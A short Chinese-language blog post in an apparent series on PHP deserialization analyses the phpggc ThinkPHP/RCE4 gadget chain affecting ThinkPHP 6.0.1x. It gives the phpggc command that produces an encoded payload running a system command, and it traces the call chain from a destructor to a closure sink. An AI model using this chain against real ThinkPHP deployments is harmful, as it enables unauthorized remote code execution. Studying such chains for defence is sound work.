---
title: phpggc thinkphp RCE4
date: 2023-06-07 22:21:31
categories:
- PHP
tags:
- Deserialization
- thinkphp
toc: true
image:
  path: /assets/images/php.png
---

> - [php-反序列化格式基础](/posts/php-反序列化格式基础/)
- [php-反序列化绕过](/posts/php-反序列化绕过/)
- [php-反序列化字符逃逸](/posts/php-反序列化字符逃逸/)
- [php-phar-反序列化](/posts/php-phar-反序列化利用/)
- [php-反序列化原生类利用](/posts/php-反序列化原生类利用/)
- [phpggc-利用链分析](/posts/phpggc-thinkphp-利用链分析/)
  - thinkphp
    - [phpggc-thinkphp-RCE1](/posts/phpggc-thinkphp-RCE1/)
    - [phpggc-thinkphp-RCE2](/posts/phpggc-thinkphp-RCE2/)
    - [phpggc-thinkphp-RCE3](/posts/phpggc-thinkphp-RCE3/)
    - [phpggc-thinkphp-RCE4](/posts/phpggc-thinkphp-RCE4/)
    - [phpggc-thinkphp-FW1](/posts/phpggc-thinkphp-FW1/)
    - [phpggc-thinkphp-FW2](/posts/phpggc-thinkphp-FW2/)


## RCE4
影响范围：
- thinkphp 6.0.1x

### 使用

```bash
phpggc ThinkPHP/RCE4 system id  -b -u
```


### 分析

RCE4 整个调用链较长,如下所示：
```php                                        
think\model\Pivot::__destruct()
    think\Model::__destruct()
        | $this->save();                                   
        | $this->updateData()
        | $this->checkAllowFields();
        | $this->db();
        | $this->name . $this->suffix  <-- 字符串连接
        think\model\concern\Conversion::__toString()
            | $this->toJson()
            | $this->toArray()
            | $this->getAttr()
            think\model\concern\Attribute::getValue()
                | $this->getJsonValue()
                $closure($value[$key], $value); * <----            
```
这条链的 sink 点与 RCE1 类似，通过闭包来达成 RCE，入口点有所不同，RCE1 针对的 5.1.x 版本中 Model 类并没有 __destruct 方法，而在 6.0.x 版本中 Model 自身就有 __destruct 方法.